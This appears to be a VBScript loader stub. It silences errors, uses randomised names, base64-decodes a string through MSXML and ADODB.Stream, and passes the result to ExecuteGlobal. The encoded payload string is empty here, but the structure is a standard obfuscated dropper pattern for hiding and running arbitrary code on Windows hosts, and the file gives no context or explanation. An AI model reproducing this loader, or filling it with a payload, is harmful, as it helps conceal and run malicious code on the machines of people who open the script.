Option Explicit
On Error Resume Next

Dim gzipfakw
gzipfakw = ""

ExecuteGlobal yfidvgbi(gzipfakw)

Function yfidvgbi(s)
    Dim taaderss, rtjixbgl
    Set taaderss = CreateObject("MSXML2.DOMDocument.6.0")
    Set rtjixbgl = taaderss.createElement("tmp")
    rtjixbgl.DataType = "bin.base64"
    rtjixbgl.text = s
    yfidvgbi = zcobjqba(rtjixbgl.nodeTypedValue)
End Function

Function zcobjqba(bytes)
    Dim klqixhws, data
    If VarType(bytes) = 0 Then
        zcobjqba = ""
        Exit Function
    End If
    
    Set klqixhws = CreateObject("ADODB.Stream")
    klqixhws.Type = 1
    klqixhws.Open
    klqixhws.Write bytes
    klqixhws.Position = 0
    klqixhws.Type = 2
    klqixhws.Charset = "UTF-8"
    zcobjqba = klqixhws.ReadText
    klqixhws.Close
    Set klqixhws = Nothing
End Function

' Clean up
gzipfakw = ""
